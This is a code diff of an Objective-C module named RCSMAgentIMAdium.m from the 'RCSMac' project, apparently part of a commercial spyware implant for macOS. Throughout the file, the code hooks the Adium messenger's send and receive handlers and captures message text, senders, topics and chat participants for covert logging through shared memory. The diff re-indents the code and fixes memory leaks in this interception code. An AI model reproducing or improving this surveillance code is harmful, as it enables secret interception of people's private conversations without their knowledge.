@@ -1,8 +1,8 @@
 //
-//  MyClass.m
+//  RCSMAgentIMAdium.m
 //  RCSMac
 //
-//  Created by Alfredo Pesoli on 2/16/12.
+//  Created by Guido on 2/16/12.
 //  Copyright 2012 HT srl. All rights reserved.
 //
 
@@ -41,13 +41,13 @@ void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSSt
   //
   if (sizeof(long) == 4) // 32bit
     {
-    [entryData appendBytes: (const void *)tmTemp
-                    length: sizeof (struct tm) - 0x8];
+      [entryData appendBytes: (const void *)tmTemp
+                      length: sizeof (struct tm) - 0x8];
     }
   else if (sizeof(long) == 8) // 64bit
     {
-    [entryData appendBytes: (const void *)tmTemp
-                    length: sizeof (struct tm) - 0x14];
+      [entryData appendBytes: (const void *)tmTemp
+                      length: sizeof (struct tm) - 0x14];
     }
   
   // Process Name
@@ -93,15 +93,18 @@ void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSSt
                           fromComponent: COMP_AGENT] == TRUE)
     {
 #ifdef DEBUG_IM_ADIUM
-    verboseLog(@"message: %@", _message);
+      verboseLog(@"message: %@", _message);
 #endif
     }
   else
     {
 #ifdef DEBUG_IM_ADIUM
-    errorLog(@"Error while logging skype message to shared memory");
+      errorLog(@"Error while logging skype message to shared memory");
 #endif
     }
+
+  [logData release];
+  [entryData release];
 }
 
 void adiumHookWrapper(id arg1, NSUInteger direction)
@@ -110,18 +113,18 @@ void adiumHookWrapper(id arg1, NSUInteger direction)
   
   if ([arg1 respondsToSelector: @selector(message)])
     {
-    NSString *topic;
-    NSString *msgType = [arg1 performSelector: @selector(type)];
-    NSUInteger msgLen = [[arg1 performSelector: @selector(message)] length];
-    
-    if (msgLen && [msgType isEqualToString: @"Message"] == YES)
-      { 
-        NSString *msgBuf  = [[arg1 performSelector: @selector(message)] string];
-        NSString *src     = [[arg1 performSelector: @selector(source)] performSelector: @selector(displayName)];
-        
-        id chat   = [arg1 performSelector: @selector(chat)];
+      NSString *topic;
+      NSString *msgType = [arg1 performSelector: @selector(type)];
+      NSUInteger msgLen = [[arg1 performSelector: @selector(message)] length];
+
+      if (msgLen && [msgType isEqualToString: @"Message"] == YES)
+        { 
+          NSString *msgBuf  = [[arg1 performSelector: @selector(message)] string];
+          NSString *src     = [[arg1 performSelector: @selector(source)] performSelector: @selector(displayName)];
+
+          id chat   = [arg1 performSelector: @selector(chat)];
 #ifdef DEBUG_IM_ADIUM
-        infoLog(@"%@ message of type: %@, len: %d, supportsTopic: %d, isGroupChat: %d, msg:%@",
+          infoLog(@"%@ message of type: %@, len: %d, supportsTopic: %d, isGroupChat: %d, msg:%@",
                 direction==ADIUM_MSG_RECEIVE?@"Received":@"Sent",
                 msgType,
                 msgLen,
@@ -129,59 +132,52 @@ void adiumHookWrapper(id arg1, NSUInteger direction)
                 [chat performSelector: @selector(isGroupChat)],
                 msgBuf);
 #endif
-        // topic
-        if ([chat performSelector: @selector(supportsTopic)] != 0)
-          topic = [chat performSelector: @selector(topic)];
-        else
-          topic = @"-";
-        
-        // peers
-        NSMutableString *activeMembers  = [[NSMutableString alloc] init];
-        if ([chat performSelector: @selector(isGroupChat)] != 0)
-          {
-          for (NSString *alias in [chat performSelector: @selector(containedObjects)])
+          // topic
+          if ([chat performSelector: @selector(supportsTopic)] != 0)
+            topic = [chat performSelector: @selector(topic)];
+          else
+            topic = @"-";
+
+          // peers
+          NSMutableString *activeMembers  = [[NSMutableString alloc] init];
+          if ([chat performSelector: @selector(isGroupChat)] != 0)
             {
-            [activeMembers appendString: [alias performSelector: @selector(ownDisplayName)]];
-            [activeMembers appendString: @", "];
+              for (NSString *alias in [chat performSelector: @selector(containedObjects)])
+                {
+                  [activeMembers appendString: [alias performSelector: @selector(ownDisplayName)]];
+                  [activeMembers appendString: @", "];
+                }
+              [activeMembers replaceCharactersInRange: NSMakeRange([activeMembers length] - 2, 2)
+                                           withString: @""];
             }
-          [activeMembers replaceCharactersInRange: NSMakeRange([activeMembers length]-2, 2) withString: @""];
-          }
-        else
-          {
-          [activeMembers appendString: src];
-          [activeMembers appendString: @", "];
-          [activeMembers appendString: 
-           [[arg1 performSelector: @selector(destination)] performSelector: @selector(displayName)]];
-          }
-        
-        adiumlogMessage(src, topic, (NSString *)activeMembers, msgBuf);
-      }
+          else
+            {
+              [activeMembers appendString: src];
+              [activeMembers appendString: @", "];
+              [activeMembers appendString: 
+                   [[arg1 performSelector: @selector(destination)] performSelector: @selector(displayName)]];
+            }
+
+          adiumlogMessage(src, topic, (NSString *)activeMembers, msgBuf);
+          [activeMembers release];
+        }
     }
   
   [outerPool release];
 }
 
-
-
 @implementation myAIContentController
 
-- (void)myfinishReceiveContentObject:(id)arg1
+- (void)myfinishReceiveContentObject: (id)arg1
 {
   adiumHookWrapper(arg1, ADIUM_MSG_RECEIVE);
   [self myfinishReceiveContentObject: arg1];  
 }
 
-- (void)myfinishSendContentObject:(id)arg1
+- (void)myfinishSendContentObject: (id)arg1
 {
   adiumHookWrapper(arg1, ADIUM_MSG_SEND);
   [self myfinishSendContentObject: arg1];
 }
 
 @end
-
-
-
-
-
-
-
